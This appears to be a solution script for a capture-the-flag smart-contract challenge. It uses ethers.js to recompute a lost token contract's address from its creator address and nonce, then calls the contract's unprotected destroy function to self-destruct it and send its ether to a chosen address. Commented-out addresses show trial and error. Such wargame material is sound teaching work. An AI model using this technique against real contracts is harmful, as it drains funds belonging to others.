(async () => {
    try {
        console.log('Running Recovery Attack script...');
        // 0xe5e00c76db49e2ab2294b19ddb3145c8975cf8a2
        // const challenge = {
        //     address: '0xA1224bcdC9298c5A4Dee391427e33b3b185851C4'
        // };
        const challenge = {
            address: '0x0eb8e4771aba41b70d0cb6770e04086e5aee5ab2'
        };
        const recomputedContractAddress = ethers.utils.getContractAddress({
            from: challenge.address,
            nonce: 129,
        });
        // These were not the correct addresses. 
        console.log(`Token Address: ${recomputedContractAddress}`);
        /*
        `0xcB327330B8a7be61Ae6DeFB7377B96D741a68fEf`        
        Token Address: 0x9866520c6f41d86a8c349a5359eefe9C03cF11A2
        Token Address: 0x95B5017B14eA3FA1Fa43A6a9efbd5438a6fFA243
        */

        const abi = [
            // Authenticated Functions
            "function transfer(address to, uint amount) returns (bool)",
            "function destroy(address payable _to) public",
        ];
        const signer = (new ethers.providers.Web3Provider(web3Provider)).getSigner()

        // This can be an address or an ENS name
        const address = "0xcB327330B8a7be61Ae6DeFB7377B96D741a68fEf";
        const erc20 = new ethers.Contract(address, abi, signer);
        console.log(erc20);
        const txn = await erc20.destroy('0xe5e00c76db49e2ab2294b19ddb3145c8975cf8a2');
        console.log(txn);
    } catch (e) {
        console.log(e.message)
    }
})()    